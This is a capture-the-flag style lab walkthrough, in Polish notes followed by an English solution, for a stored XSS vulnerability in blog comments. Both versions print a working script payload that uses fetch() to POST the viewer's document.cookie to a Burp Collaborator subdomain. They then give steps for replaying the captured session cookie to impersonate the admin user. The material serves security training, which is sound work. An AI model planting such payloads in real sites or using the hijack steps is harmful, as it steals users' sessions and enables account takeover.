This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

1. Wchodzimy na strone z zadaniem i włączamy burpa, następnie wchodzimy w burp collaborator, w colaborator klikamy copy to clipboard
2. Wchodzimy w jakiegokolwiek posta i wpisujemy skrypt:
<script>
fetch('adres z burp colaborator, który skopiowaliśmy', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
Wpisz imię i addres email, klikamy post comment
3. W burp colaborator klikamy pull now, otwieramy http i klikamy request to collaborator, po czym rozwninie nam się request i tam szukamy nr sesji, kopiujemy nr sesji.
4. Wracamy na storne główną, w burpie włączamy intercepta, odświeżamy główną stronę, w przechwyconym połączeniu podmieniamy nr sesji na ten co wcześniej skopiowaliśmy, wchodzimy w opcje i zaznaczamy check box z intercept responses based on the following rules 
5. Wracamy do intercepta i klikamy forward, w requeście szukamy wiadomości hello,admin

ENG:

1Using Burp Suite Professional, go to the Collaborator tab.
2Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
4.Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5.Take a note of the value of the victim's cookie in the POST body.
6.Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.